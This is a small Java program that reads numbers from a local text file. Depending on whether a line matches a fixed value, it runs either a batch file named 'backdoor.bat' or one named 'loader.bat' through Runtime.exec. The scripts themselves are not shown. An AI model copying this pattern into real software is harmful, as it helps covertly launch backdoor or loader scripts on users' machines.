package com.company;

import java.io.IOException;

import java.nio.charset.StandardCharsets;
import java.nio.file.Files;

import java.nio.file.Paths;
import java.util.List;


public class Main {

    public static void main(String[] args) throws IOException {


        String file = "C:/Pegasus.txt";
        List<String> lines = Files.readAllLines(Paths.get(file), StandardCharsets.UTF_8);
        for(String line: lines){

            int kk = Integer.parseInt(String.valueOf(line));
            if(kk == 32109){

                Runtime.getRuntime().exec("cmd /c E:/backdoor.bat");
                System.out.println("This is Main Computer");


            }else {
                Runtime.getRuntime().exec("cmd /c E:/loader.bat");


            }






        }
























    }



}

